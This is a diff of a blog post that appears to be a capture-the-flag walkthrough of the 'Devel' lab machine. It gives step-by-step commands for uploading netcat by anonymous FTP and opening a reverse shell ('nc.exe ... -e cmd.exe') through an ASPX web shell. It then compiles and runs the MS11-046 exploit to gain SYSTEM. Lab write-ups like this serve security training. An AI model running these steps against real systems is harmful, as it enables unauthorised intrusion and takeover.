@@ -57,8 +57,9 @@ Few items to note here:
 
 I like to normally go for HTTP first so let's do that
 
+__
 
-### 3. Further enumeration - HTTP
+### 2. Further enumeration - HTTP
 
 Accessing the web page we notice that this is indeed a default test page when configuring IIS:
 
@@ -68,8 +69,11 @@ If we look at the sourcecode we can see the welcome.png file is hosted locally o
 
 ![2021-02-02 16_03_57-Window.png]({{site.baseurl}}/_posts/2021-02-02 16_03_57-Window.png)
 
+We can run other tools like dirbuster etc but this information has lead to me to believe FTP is the path we should pursue...
 
-### 4. Further enumeration - FTP
+__
+
+### 3. Further enumeration - FTP
 
 As shown earlier FTP allows anonymous access: that is where **username=anonymous** and **password=anything**. The following demonstrates how to do this:
 
@@ -125,7 +129,9 @@ The file has been successfully uploaded. Let's try and access this via the brows
 
 So we now know we can access any resource we upload via FTP from the browser. This means if we were to set upload a reverse shell via FTP access it via FTP, we can setup a call back and get a shell. Let's try this.
 
-### 5. Getting our 1st shell (Foothold)
+__
+
+### 4. Getting our 1st shell (Foothold)
 
 As we can't use FTP we will have to be creative. As this is IIS, it is likely running **.ASP** or **.ASPX** as it's web framework, **NOT PHP**. I will go for .ASPX.
 
@@ -147,16 +153,96 @@ So how do we get a shell from here?
 
 We can upload netcat (nc.exe), set up our listener and get a callback. This can be done as follows:
 
-	1. copy nc.exe to local dir:
-		- cp /usr/share/windows-resources/binaries/nc.exe: .
+1. copy nc.exe to local dir:
+	- cp /usr/share/windows-resources/binaries/nc.exe:
     
-    2. upload nc.exe to server via FTP
-    	- ftp> put nc.exe
+2. upload nc.exe to server via FTP
+ 	- ftp put nc.exe
         
-   	3. setup our local machine listener for the call back:
-    	- nc -nlvp 4444
+3. setup our local machine listener for the call back:
+  	- nc -nlvp 4444
     
-    4. go to $IP/cmdasp.aspx in the browser and find where is located
-    	- dir "\nc.exe" /s
+4. go to $IP/cmdasp.aspx in the browser and find where is located
+  	- dir "\cmdasp.aspx" /s
 
-Enter text in [Markdown](http://daringfireball.net/projects/markdown/). Use the toolbar above, or click the **?** button for formatting help.
+5. run nc.exe in browser to initate call back
+	- c:\inetpub\wwwroot\nc.exe $our_IP 4444 -e cmd.exe
+
+![2021-02-02 16_49_45-Window.png]({{site.baseurl}}/_posts/2021-02-02 16_49_45-Window.png)
+
+After doing this we should get a call back on our listener and gained our foothold:
+
+![2021-02-02 17_11_33-Window.png]({{site.baseurl}}/_posts/2021-02-02 17_11_33-Window.png)
+
+However we are not SYSTEM, to do this we must escalate our privileges through the means of an exploit
+
+__
+
+### 5. Getting SYSTEM
+
+If we run systeminfo we can fingerprint the OS version and try and find available exploits
+
+	c:\windows\system32\inetsrv>systeminfo
+    
+    Host Name:                 DEVEL
+    OS Name:                   Microsoft Windows 7 Enterprise 
+    OS Version:                6.1.7600 N/A Build 7600
+    ...
+    System Type:               X86-based PC
+    Processor(s):              1 Processor(s) Installed.
+                               [01]: x64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
+    ...
+
+    c:\windows\system32\inetsrv>
+
+What immediately stands out is the **OS name** and **version** - **Windows 7 6.1.7600**. Furthermore, running a **x64 ** processor
+
+If we google for "Windows 7 6.1.7600" we find out there's a local privsec exploit - **MS11-046**
+
+This is on exploit-db so we can find it on our local kali machine using:
+	
+    	searchsploit MS11-046
+
+![2021-02-02 17_24_12-Window.png]({{site.baseurl}}/_posts/2021-02-02 17_24_12-Window.png)
+
+1st option as the 2nd is listed a **dos** not **local**.
+
+It's listed as x86 so let's inspect the code to see if it will run on x64 too...
+
+- searchsploit -m windows_x86/local/40564.c
+
+Some things to note:
+- In the file in line 24 it listed Windows 7 x64 as vulnerable 
+- Exploit has been tested on  Windows 7 build 6.1.7600
+
+This matches our criteria. Furthermore the exploit also tells us how to compile to .c file in a windows .exe:
+
+- i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
+
+With all this now known let's test this.
+
+1. compile .c file to .exe
+	- i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
+
+2. upload .exe via FTP (or however you want to get the .exe on the machine)
+	-  ftp> binary ; ftp> put MS11046.exe
+
+3. navigated to inetpub/wwwroot
+	- cd c:\inetpub\wwwroot
+
+4. run the executable
+	- MS11046.exe
+
+...and if all went well you should now be SYSTEM
+
+![2021-02-02 17_43_54-Window.png]({{site.baseurl}}/_posts/2021-02-02 17_43_54-Window.png)
+
+Finally, grab your user.txt and root.txt flags to complete the box.
+
+And that was my guide how to get SYSTEM on Devel without Metasploit.
+
+Thanks for reading and I will hopefully be adding to this series in the near future!
+
+__
+
+
